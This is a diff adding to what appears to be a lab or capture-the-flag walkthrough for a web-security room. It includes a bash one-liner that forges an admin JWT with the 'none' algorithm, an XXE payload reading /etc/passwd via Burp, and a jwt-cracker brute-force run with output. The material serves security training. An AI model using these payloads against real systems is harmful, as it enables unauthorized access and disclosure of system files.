@@ -279,3 +279,68 @@ Complete Bash script to grab the flag, just change the IP variable and you are g
 ```
 ip="10.10.150.255"; echo "LOGIN AS NORMAL USER"; curl -d "username=[removed]&password=[removed]" -X POST --silent http://$ip/auth -c jwt_none; curl -b jwt_none --silent http://$ip/private | grep -o -P '(?<=h1>\s).*(?=\s</h1)'; echo; echo "CHANGING ROLE TO ADMIN"; jwt_body=$(cat jwt_none | grep -o -P '(?<=token\s).*'); echo; echo "JWT BODY FROM COOKIE"; echo $jwt_body; header=$(echo $jwt_body | cut -d"." -f1); payload=$(echo $jwt_body | cut -d"." -f2); echo; echo "OLD HEADER"; echo $header; echo; echo "OLD PAYLOAD"; echo $payload; decoded_header=$(echo $header | base64 -d); echo; echo "OLD DECODED HEADER"; echo $decoded_header; echo; echo "CHANGE ALG TO NONE"; change_header=$(echo $decoded_header | sed 's/HS256/none/g'); echo $change_header; echo; echo "OLD DECODED PAYLOAD"; decoded_payload=$(echo $payload | base64 -d); echo $decoded_payload; echo; echo "CHANGE ROLE TO ADMIN"; change_payload=$(echo $decoded_payload | sed 's/"user"/"admin"/g'); echo $change_payload; echo; echo "ENCODE NEW HEADER AND NEW PAYLOAD"; new_header=$(echo $change_header | base64 -w 0 | tr -d "="); new_payload=$(echo $change_payload | base64 -w 0 | tr -d "="); echo $new_header; echo $new_payload; echo; echo "NEW JWT WITHOUT SECRET"; new_jwt=$new_header.$new_payload.; echo $new_jwt; echo; echo "CREATE NEW COOKIE AND STORE NEW ADMIN JWT"; cp jwt_none jwt_admin; ls -lrta jwt_admin; pattern=$(cat jwt_none | grep -o -P '(?<=token\s).*'); echo; echo "SEARCHING FOR"; echo $pattern; echo; echo -n "UPDATING COOKIE"; sed -i "s/$pattern/$new_jwt/g" jwt_admin; echo; cat jwt_admin; echo; echo "TESTING ADMIN LOGIN"; curl -b jwt_admin --silent http://$ip/private | grep "text-center"
 ```
+
+# Task 19 - XXE - Intro
+Improper handling of posted XML documents can lead to XXE, XML External Entity Injection.
+
+# Task 20 - XXE - Manual Exploitation
+XXE Research
+* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe
+
+# Task 21 - XXE - Automatic Exploitation
+Research
+
+# Task 22 - XXE - Challenge
+* Load Burp and site
+* Turn intercept off
+* On site main page fill out form name, tel, email, and password and then submit the request
+* Look at Burp HTTP History
+* Find the POST item and send to repeater
+* In repeater
+    * Insert XXE payload to grab /etc/passwd in between XML version and root element
+    ```
+    <?xml version="1.0" encoding="UTF-8"?>
+
+    <!DOCTYPE data [<!ELEMENT data ANY><!ENTITY file SYSTEM "file:///etc/passwd">]>
+
+    <root>
+    ```
+    * In any child element replace the text with &file;
+    ```
+    <email>&file;</email>    
+    ```
+    * Click send and you will have the /etc/passwd to complete the challenge
+
+# Task 23 - JWT cracking
+If you have the full JWT it can be brute forced
+
+# Task 24 - JWT cracking
+Tool
+* https://github.com/lmammino/jwt-cracker
+Syntax
+* jwt-cracker [token] [alphabet] [max-length]
+
+# Task 25 - Challenge
+Crack the given token
+```
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.it4Lj1WEPkrhRo9a2-XHMGtYburgHbdS5s7Iuc1YKOE 
+```
+```
+jwt-cracker eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.it4Lj1WEPkrhRo9a2-XHMGtYburgHbdS5s7Iuc1YKOE abcdefghijklmnopqrstuvwxyz
+Attempts: 100000
+Attempts: 200000
+Attempts: 300000
+SECRET FOUND: [removed]
+Time taken (sec): 8.876
+Attempts: 346830
+```
+
+# Task 26 - Credits
+XXE Lab
+* https://github.com/jbarone/xxelab
+
+SSTI Lab
+* https://github.com/DiogoMRSilva/websitesVulnerableToSSTI
+
+JWT Demo
+* https://github.com/Sjord/jwtdemo/
